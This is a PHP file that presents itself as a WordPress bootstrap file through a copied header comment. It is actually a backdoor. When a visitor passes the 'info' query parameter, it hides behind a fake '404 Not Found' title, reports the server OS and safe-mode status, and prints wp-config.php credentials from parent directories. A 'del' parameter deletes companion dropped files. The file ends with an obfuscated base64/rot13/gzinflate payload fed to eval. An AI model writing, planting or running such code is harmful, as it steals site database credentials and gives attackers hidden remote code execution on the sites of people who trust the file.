<?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the scripts environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * config.php file.
 *
 * Will also search for wp-config.php in scripts' parent
 * directory to allow the scripts directory to remain
 * untouched.
 *
 * @internal This file must be parsable by PHP4.
 *
 * @package scripts
 */

error_reporting(0); 
if(isset($_GET['info'])){
echo "<title>HTTP 404 Not Found</title>";
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4,1ON(BuSuX)";
}
else {$safemode = false; $hsafemode = "OFF(WoKeH)";}
$os = wordwrap(php_uname(),90,"<br>",1);
$xos = "Safe-mode:[Safe-mode:".$hsafemode."] 7 [OS:".$os."]";
echo "<center> ".$xos." </center><br>";
$lol = file_get_contents("../../../../../wp-config.php");
$lol2 = file_get_contents("../../../../../../wp-config.php");
print $lol; print $lol2;
}

if(isset($_GET['del'])){
@unlink("./xml.php");
@unlink("./upload.php");
@unlink("./export-check-settings.php");
}

eval(str_rot13(gzinflate(str_rot13(base64_decode('WpDJrqNTAAA/dF7EAXVpUjnYrDa7zX4Z0exzesC48dd0ZVgd60VFrd1n/tRa9buCDc387OORYufUrP9m80evPPsbrQtR688v30FGXNS84xhxLJ7u/pwuCWp/ymHc7JHV7+/nde9oFe7ziELjtZcEdmnbSiVKGwBdkCHYUZH0N4CB9nZVZbC7+pZqA2NFCXr17WRI+QNt1YTQ5kw9RlDPqTJRDKdwIqP7DE0Q0HBiZcE4yclTXpigP8kjs73G1dN0tsuKCrk+yXA3p9pNAwcop8CL7gxZDjRjsitjZHb0TtoshZeaxi5JLd7U6BiHiXUStJuhYfPEGuV+cU10Qt4mBbxGd/6y2q2+hDloib9k6F48d1kU/76FQPhHL/bkUAuYoS3x2RW1CL+SuRGNSxJhy+wQwfkE2UFc0DOpwnpJDrvbWovkeeuS8zxGATyLy+QG77YMqG9MOdxM91a4SDUX7H9tKvS8EmF4JzkP6XreiDpcdVm0EyakIiqv1WAqgY7zdW6v+xryx7hUs1lw5cFBqmO/grhrJnZpFwBHpIXWJAcMoUacC7heq9f2tvuQzoGX6T5p6c61E8PAsjIfL9NxBwgZnKmHs8VLOfLGyvzJvXwQ589CMj4WNKOAc/V1ZRcroa5V/bjv1SYKidGTSW9LqX4tqjgV30mdw+qZB0G4Q7LfffLFgO3yaAuoiwibzkAya81u/Dj8qSUTbUNImDaPqqkLNMKakgrOOTnHLpoiHXGfOh9QpblM9O7ZISpC49bfeM1r85boMgKCi9g/tk4+sZsmkS6oHHzYLezEP9NSU5sp3atTSL+KYnKMPtw3mjUeKvlkxrw1aAdyz2UpuiGicfebboLJzk0szEkTX5L/8gWyNikg1F8o7Ilc5hr/4Yaw6xiJJMjwUJPiP7/++o+//wU=')))));
?>